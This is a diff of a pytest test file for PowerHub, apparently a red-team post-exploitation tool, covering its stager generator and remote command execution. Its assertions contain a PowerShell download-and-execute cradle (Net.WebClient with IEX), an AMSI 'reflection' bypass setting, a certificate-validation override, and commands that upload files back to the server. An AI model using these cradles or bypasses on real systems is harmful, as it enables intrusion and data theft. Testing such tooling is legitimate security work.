@@ -4,17 +4,16 @@
 import os
 import sys
 import time
-from subprocess import check_output
-from shlex import split
 #  import tempfile
 import re
 import requests
 
 import pytest
+import bs4
 
 # https://stackoverflow.com/a/33515264/1308830
 sys.path.append(os.path.join(os.path.dirname(__file__), 'helpers'))
-from test_init import TEST_URI, TEST_COMMANDS, init_tests  # noqa
+from test_init import TEST_URI, TEST_COMMANDS, init_tests, execute_cmd  # noqa
 
 
 MAX_TEST_MODULE_PS1 = 103
@@ -28,47 +27,49 @@ def get_stager():
     param_set = {
         'default': {
             "flavor": "hub",
-            "GroupLauncher": "powershell",
-            "GroupAmsi": "reflection",
-            "GroupTransport": "http",
-            "GroupClipExec": "none",
-            "CheckboxProxy": "false",
-            "CheckboxTLS1.2": "false",
-            "RadioFingerprint": "true",
-            "RadioNoVerification": "false",
-            "RadioCertStore": "false",
+            "Launcher": "powershell",
+            "Amsi": "reflection",
+            "Transport": "http",
+            "ClipExec": "none",
+            "Proxy": "false",
+            "TLS1.2": "false",
+            "Fingerprint": "true",
+            "NoVerification": "false",
+            "CertStore": "false",
         },
         'HTTPS': {
             "flavor": "hub",
-            "GroupLauncher": "powershell",
-            "GroupAmsi": "reflection",
-            "GroupTransport": "https",
-            "GroupClipExec": "none",
-            "CheckboxProxy": "false",
-            "CheckboxTLS1.2": "false",
-            "RadioFingerprint": "true",
-            "RadioNoVerification": "false",
-            "RadioCertStore": "false",
+            "Launcher": "powershell",
+            "Amsi": "reflection",
+            "Transport": "https",
+            "ClipExec": "none",
+            "Proxy": "false",
+            "TLS1.2": "false",
+            "Fingerprint": "true",
+            "NoVerification": "false",
+            "CertStore": "false",
         },
         'BASH': {
             "flavor": "hub",
-            "GroupLauncher": "bash",
-            "GroupAmsi": "reflection",
-            "GroupTransport": "http",
-            "GroupClipExec": "none",
-            "CheckboxProxy": "false",
-            "CheckboxTLS1.2": "false",
-            "RadioFingerprint": "true",
-            "RadioNoVerification": "false",
-            "RadioCertStore": "false",
+            "Launcher": "bash",
+            "Amsi": "reflection",
+            "Transport": "http",
+            "ClipExec": "none",
+            "Proxy": "false",
+            "TLS1.2": "false",
+            "Fingerprint": "true",
+            "NoVerification": "false",
+            "CertStore": "false",
         },
     }
     i = 0
     while i < 10:
         try:
             for k, v in param_set.items():
-                result[k] = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
-                                         params=v).text
+                response = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
+                                        params=v).text
+                soup = bs4.BeautifulSoup(response, features='lxml')
+                result[k] = soup.find('code').getText()
             break
         except requests.exceptions.ConnectionError:
             i += 1
@@ -76,15 +77,6 @@ def get_stager():
     result["POWERSHELL_ESCAPED_QUOTES"] = result["default"].replace("'",
                                                                     '\\"')
     return result
-
-
-def execute_cradle(cmd):
-    env = os.environ
-    env["PYTHONIOENCODING"] = "utf8"
-    return check_output(
-        split(cmd),
-        env=env,
-    )[:-1].decode()
 
 
 def create_modules():
@@ -109,19 +101,19 @@ def full_app():
 
 
 def test_stager(full_app):
-    assert full_app['default'] == (
+    assert (
         "$K=New-Object Net.WebClient;IEX "
         + f"$K.DownloadString('http://{TEST_URI}:8080"
         + "/0?t=http&f=h&a=reflection');"
-    )
-    assert full_app['HTTPS'].startswith(
+    ) in (full_app['default'])
+    assert (
         "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
         + "={param($1,$2);$2.Thumbprint -eq '"
-    )
-    assert full_app['HTTPS'].endswith(
+    ) in (full_app['HTTPS'])
+    assert (
         "'};$K=New-Object Net.WebClient;IEX $K.DownloadString"
         + f"('https://{TEST_URI}:8443/0?t=https&f=h&a=reflection');"
-    )
+    ) in (full_app['HTTPS'])
 
     win10cmd = TEST_COMMANDS["win10"] % full_app
     # Insert formatter for extra command
@@ -136,15 +128,15 @@ def test_stager(full_app):
 
 
 def run_test_remote(cmd):
-    out = execute_cradle(cmd(""))
+    out = execute_cmd(cmd(""))
     assert "Adrian Vollmer" in out
     assert "Run 'Help-PowerHub' for help" in out
 
-    out = execute_cradle(cmd("lshm"))
+    out = execute_cmd(cmd("lshm"))
     for i in range(MAX_TEST_MODULE_PS1):
         assert "psmod%d" % i in out
 
-    out = execute_cradle(cmd("lhm psmod53|fl;Invoke-Testfunc53"))
+    out = execute_cmd(cmd("lhm psmod53|fl;Invoke-Testfunc53"))
     assert "Test53" in out
     assert "psmod53" in out
     assert re.search("Name *: ps1/psmod53.ps1\r\n", out)
@@ -152,7 +144,7 @@ def run_test_remote(cmd):
     assert re.search("N *: 72\r\n", out)
     assert re.search("Loaded *: True\r\n", out)
 
-    out = execute_cradle(
+    out = execute_cmd(
         cmd('$p="72-74,77";lhm $p;Invoke-Testfunc53;'
             + "Invoke-Testfunc99;Invoke-Testfunc47;Invoke-Testfunc72;")
     )
@@ -165,7 +157,7 @@ def run_test_remote(cmd):
 
     from powerhub.directories import UPLOAD_DIR
     testfile = "testfile.dat"
-    out = execute_cradle(
+    out = execute_cmd(
         cmd(('$p=-join ($env:TEMP,"\\\\%s");'
              + '[io.file]::WriteAllBytes($p,(1..255));'
              + 'pth $p;rm $p') % testfile)
@@ -175,7 +167,7 @@ def run_test_remote(cmd):
         data = f.read()
     assert data == bytes(range(1, 256))
 
-    out = execute_cradle(
+    out = execute_cmd(
         cmd('$p="FooBar123";$p|pth -name %s;' % testfile)
     )
     time.sleep(1)
